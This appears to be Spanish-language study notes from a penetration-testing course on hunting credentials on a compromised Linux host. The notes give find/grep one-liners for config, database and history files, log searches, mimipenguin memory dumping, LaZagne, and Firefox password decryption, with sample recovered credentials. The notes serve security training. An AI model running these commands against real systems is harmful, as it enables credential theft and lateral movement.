#### Buscar ficheros en ficheros

Localizar ficheros tipicos de configuracion
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Localizar cadenas de texto como `user, password, pass` en ficheros .cnf (adaptar la extension si fuera neccesario, no solo a conf, sino a .txt, .py, sh, doc*, xls*, odt, ods y cualquer tipo de fichero que se te ocurra)

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

Localizar ficheros de bases de datos
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

Localizar ficheros de notas
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Localizar scripts de los formatos mas comunes
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

> Mirar tambien de encontrar ficheros .env
### Credenciales en cronjobs
/etc/crontab, cron.daily, cron.hourly, cron.monthly, cron.weekly, cron.d

Localizar credenciales e info interesante en el historial
```bash
tail -n5 /home/*/.bash*
```


### información relevante en logs
Mirar archivos de registro, igual no encontramos credenciales, pero si información interesante que nos puede servir para orientar el tiro de alguna manera.

|**Archivo**|**Descripción**|
|---|---|
|`/var/log/messages`|Registros genéricos de actividad del sistema.|
|`/var/log/syslog`|Registros genéricos de actividad del sistema.|
|`/var/log/auth.log`|(Debian) Todos los registros relacionados con la autenticación.|
|`/var/log/secure`|(RedHat/CentOS) Todos los registros relacionados con la autenticación.|
|`/var/log/boot.log`|Información sobre el arranque.|
|`/var/log/dmesg`|Información y registros relacionados con el hardware y los controladores.|
|`/var/log/kern.log`|Advertencias, errores y registros relacionados con el kernel.|
|`/var/log/faillog`|Intentos de inicio de sesión fallidos.|
|`/var/log/cron`|Información relacionada con los trabajos cron.|
|`/var/log/mail.log`|Todos los registros relacionados con el servidor de correo.|
|`/var/log/httpd`|Todos los registros relacionados con Apache.|
|`/var/log/mysqld.log`|Todos los registros relacionados con el servidor MySQL.|
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Credenciales en memoria y caché
https://github.com/huntergregal/mimipenguin

```bash
sudo python3 mimipenguin.py
```

### laZagne
Mirar credenciales con lasagne en Linux, es incluso mas potente que en windows, ya que mira en cualquier lugar, como por ejemplo:

- Wifi
- Wpa_supplicant
- Libsecret
- Kwallet
- Basados en Chromium
- CLI
- Mozilla
- Thunderbird
- Git
- Variables de entorno (ENV)
- Grub
- Fstab
- AWS
- Filezilla
- Gftp
- SSH
- Apache
- Shadow
- Docker
- Keepass
- Mimipy
- Sesiones (Sessions)
- Llaveros de claves (Keyrings)

```
sudo python2.7 laZagne.py all
```

### Credenciales de mozilla
Por defecto los ficheros de login (cifrados), se encuentran en carpetas dentro de este directorio, el ejemplo:
```
ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default

# En estos directorios podemos encontrar el logins.json
```

Miramos dentro del fichero logins.json y lo pasamos por jq para que le de un formato legible
```bash
glmbx@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
```

Posteriormente podemos tratar de desencriptar las credenciales con `Firefox Decrypt` 
https://github.com/unode/firefox_decrypt
> Requiere Python 3.9, sino habria que usar FirefoxDecrypt con Python2

```
python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

Alternativamente se pueden desencriptar con LaZagne si el navegador es compatible:
```
python3 laZagne.py browsers
```